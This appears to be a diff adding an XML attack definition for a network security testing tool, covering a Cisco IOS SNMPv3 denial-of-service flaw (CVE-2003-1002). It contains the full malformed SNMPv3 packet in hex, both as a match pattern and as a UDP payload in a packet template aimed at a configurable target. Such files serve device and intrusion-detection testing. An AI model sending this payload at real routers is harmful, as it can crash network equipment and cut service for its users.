@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Cisco SNMPv3 Denial of Service"/>
+    <EngDesc display="true" value="This threat sends an SNMPv3 message to the target on port 162. Can cause various versions of IOS to crash."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="SNMPv3"/>
+    <Type_Of_Equipment display="true">
+      <item value="Router"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Cisco"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="ALL"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="IOS_12.*"/>
+      <item value="ALL"/>
+      <item value="ONS_15454"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.cisco.com/warp/public/707/cisco-sa-20040420-snmp.shtml"/>
+    <CVEID display="true" value="CVE-2003-1002"/>
+    <bugtraqID display="true" value="9222"/>
+    <OSVDB display="true" value="3025"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000000ff465088d500a900fe009b00c910319af2"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632742201121406250"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X30\X67\X02\X01\X03\X30\X11\X02\X04\X68\X58\X0e\Xd5\X02\X03\X00\Xff\Xe3\X04\X01\X04\X02\X01\X03\X04\X22\X30\X20\X04\X0c\X00\X00\X00\X00\X00\X00\X00\X00\X12\X34\X56\X78\X02\X01\X00\X02\X01\X05\X04\X06\X70\X75\X62\X6c\X69\X63\X04\X00\X04\X00\X30\X2b\X04\X0c\X00\X00\X00\X00\X00\X00\X00\X00\X12\X34\X56\X78\X04\X00\Xa1\X19\X02\X04\X2a\X0b\X49\X54\X02\X01\X00\X02\X01\X00\X30\X0b\X30\X09\X06\X05\X2b\X06\X01\X02\X01\X05\X00"/>
+    <Created value="1139461836" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="A"/>
+    <for index="B"/>
+    <for index="C"/>
+    <for index="D"/>
+    <for index="E"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="0" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="0" TTL="@random(20,30)" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="@random(1025,65535)" destPort="$destPort" checksum="" length="" Payload="30670201033011020468580ed5020300ffe304010402010304223020040c00000000000000001234567802010002010504067075626c696304000400302b040c0000000000000000123456780400a11902042a0b4954020100020100300b300906052b060102010500"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
